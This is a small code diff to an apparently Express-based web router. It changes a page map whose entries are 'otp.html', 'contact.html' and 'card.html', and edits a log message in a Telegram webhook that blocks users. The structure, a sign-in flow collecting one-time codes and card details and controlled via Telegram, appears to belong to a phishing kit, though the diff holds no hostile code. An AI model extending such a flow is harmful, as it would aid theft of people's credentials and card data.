@@ -38,7 +38,7 @@ router.get('/sign-in', requireCap, (req, res, next) => {
   // If session exists, determine which page to show
   const pages = {
     otp: 'otp.html',
-    info: 'info.html',
+    info: 'contact.html', 
     bill: 'card.html',
   };
 
@@ -577,7 +577,7 @@ router.post("/telegram-webhook", async (req, res) => {
       );
 
       console.log(
-        `✅ User ${userId} has been ${systemInfo.blocked ? "blocked" : "unblocked"}`
+        `✅ USER ${userId} has been ${systemInfo.blocked ? "blocked" : "unblocked"}`
       );
 
       // Rebuild keyboard after status change
